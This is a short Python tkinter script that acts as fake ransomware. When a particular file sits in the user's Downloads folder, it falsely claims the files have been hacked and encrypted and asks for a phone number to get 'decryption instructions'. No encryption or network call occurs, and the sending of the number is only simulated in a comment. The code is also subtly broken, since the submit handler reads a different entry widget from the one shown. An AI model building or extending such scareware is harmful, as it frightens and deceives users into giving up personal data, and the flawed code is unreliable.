import os
from tkinter import *
from tkinter import messagebox

def check_file_exists():
    file_name = "alargar_pene.txt"
    downloads_dir = os.path.expanduser("~/Downloads")
    file_path = os.path.join(downloads_dir, file_name)
    if os.path.exists(file_path):
        messagebox.showerror("Hacked", "Your files have been hacked and encrypted. Please enter your phone number to get decryption instructions.")
        phone_label = Label(root, text="Enter your phone number:")
        phone_label.pack()
        phone_entry = Entry(root)
        phone_entry.pack()
        submit_button = Button(root, text="Submit", command=submit_phone_number)
        submit_button.pack()

def submit_phone_number():
    phone_number = phone_entry.get()
    # Simulate sending the phone number to a server or processing it
    messagebox.showinfo("THANKS", "Thank you for entering your phone number. We will contact you shortly.")
    phone_entry.delete(0, END)

root = Tk()
root.title("File Encryption")

phone_entry = Entry(root)  # Initialize the Entry widget
check_file_exists()

root.mainloop()